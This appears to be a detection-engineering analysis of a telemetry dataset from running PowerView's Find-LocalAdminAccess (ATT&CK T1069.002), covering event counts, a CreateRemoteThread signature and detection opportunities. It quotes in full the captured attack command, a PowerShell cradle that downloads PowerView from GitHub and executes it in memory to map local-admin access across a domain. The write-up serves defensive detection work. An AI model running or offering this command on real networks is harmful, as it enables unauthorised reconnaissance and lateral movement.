# T1069.002-4: Domain Groups — Find Machines Where User Has Local Admin Access (PowerView)

## Technique Context

T1069.002 (Domain Groups) with PowerView's `Find-LocalAdminAccess` is one of the most operationally significant reconnaissance techniques in Active Directory environments. Rather than merely enumerating group memberships, `Find-LocalAdminAccess` actively tests whether the currently authenticated user has local administrator access on every domain-joined machine. It does this by attempting to connect to the `ADMIN$` share or performing SAMR-based group queries across all domain computers, effectively mapping the attacker's lateral movement opportunities in a single operation.

This technique is central to post-exploitation workflows: an attacker who has compromised a low-privilege account can run `Find-LocalAdminAccess` to discover every machine where that account's credentials work for lateral movement. The technique combines domain enumeration (getting the list of computers from LDAP) with live connectivity testing (checking admin access per host), making it more detectable through network traffic than purely LDAP-based approaches. Detection engineering focuses on the download cradle for PowerView, the `Find-LocalAdminAccess` function name in script block logs, high-volume SMB/SAMR connection attempts to multiple hosts in rapid succession, and process injection artifacts.

In the defended version, Windows Defender blocked execution with `STATUS_ACCESS_DENIED`. With Defender disabled, PowerView downloaded and executed fully.

## What This Dataset Contains

Security EID 4688 captures the full attack command:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose}
```

This uses a pinned commit hash (`f94a5d298a1b4c5dfb1f30a246d9c73d13b22888`) rather than `master`, indicating version control of the specific PowerView build. The `Find-LocalAdminAccess -Verbose` call with verbose output is characteristic of interactive or automated red team workflows that want confirmation of accessible machines. A cleanup PowerShell process with empty command block (`"powershell.exe" & {}`) appears as a second EID 4688 event.

Sysmon provides 20 events: 12 EID 7 (image load), 3 EID 1 (process create), 3 EID 10 (process access), 1 EID 17 (pipe create), and 1 EID 8 (CreateRemoteThread). The EID 8 CreateRemoteThread event shows `powershell.exe` (PID 4252) creating a thread in an `<unknown process>` (PID 3764, NewThreadId 3416) at `StartAddress: 0x00007FF77E8753A0` — the same start address seen in T1069.002-12 and T1069.002-13, confirming this is a consistent PowerView execution signature. The three EID 1 process create events capture two `whoami.exe` executions (test framework checks) and the main PowerShell instance; no additional child processes beyond PowerShell were spawned by the technique execution within the sample window.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103), comparable to the other PowerView tests in this batch, reflecting the same PowerView.ps1 script body being logged across script blocks.

Compared to the defended version (27 sysmon, 9 security, 41 PowerShell events), this undefended run shows fewer sysmon events (20 vs 27 — lower, as Defender monitoring overhead is absent), matching security event patterns (4 vs 9 with the difference from the defended run's ACCESS_DENIED termination events), and higher PowerShell events (96 vs 41), confirming full script execution.

## What This Dataset Does Not Contain

Network connection telemetry (Sysmon EID 3) for the outbound GitHub download request and the per-host admin access checks are absent from the samples. `Find-LocalAdminAccess` generates high-volume network traffic to every domain computer — these connections are the most operationally significant evidence of the technique but are not captured in the sampled events. The actual list of machines where the user has local admin access is not present in any telemetry channel.

The pinned commit hash in the URL (`f94a5d298...`) is visible in the command line but cannot be validated against the actual file downloaded without network logging.

## Assessment

This dataset provides clear command line evidence of PowerView's lateral movement reconnaissance function executing successfully. The EID 4688 command line with the specific commit hash, `Find-LocalAdminAccess`, and `-Verbose` flag is a high-fidelity detection anchor. The EID 8 CreateRemoteThread artifact at the consistent PowerView start address (`0x00007FF77E8753A0`) provides a process-level detection opportunity that complements command line analysis.

The absence of network telemetry limits this dataset's ability to demonstrate the full scope of `Find-LocalAdminAccess` activity (which is most visible in network traffic), but the process execution and script loading evidence is solid.

## Detection Opportunities Present in This Data

1. **EID 4688 / Sysmon EID 1 — `Find-LocalAdminAccess` in PowerShell command line**: The function name combined with the PowerSploit download URL is unambiguous. The specific commit hash (`f94a5d298...`) also serves as an IOC for this exact PowerView version.

2. **Sysmon EID 8 — CreateRemoteThread from PowerShell at `0x00007FF77E8753A0`**: This address appears across T1069.002-4, T1069.002-5, T1069.002-6, T1069.002-12, and T1069.002-13 — all PowerView tests in this batch. It represents a stable behavioral fingerprint for this PowerView build.

3. **EID 4104 — script block logging of `Find-LocalAdminAccess` function definition or call**: When PowerView is loaded via IEX, script block logging captures the function. The function name `Find-LocalAdminAccess` in EID 4104 is highly specific to PowerView.

4. **Pinned commit hash in GitHub download URL**: The URL component `f94a5d298a1b4c5dfb1f30a246d9c73d13b22888` is a version-specific IOC. Any process command line or script block log containing this hash combined with `PowerSploit` identifies this exact PowerView release.

5. **Sequence of high-volume SMB or SAMR connections from a workstation**: While not captured in these samples, `Find-LocalAdminAccess` generates a sweep of connection attempts to multiple domain computers. Detecting rapid sequential network connections from a workstation to many hosts on SMB ports (445) following a PowerShell script execution is a strong composite indicator.
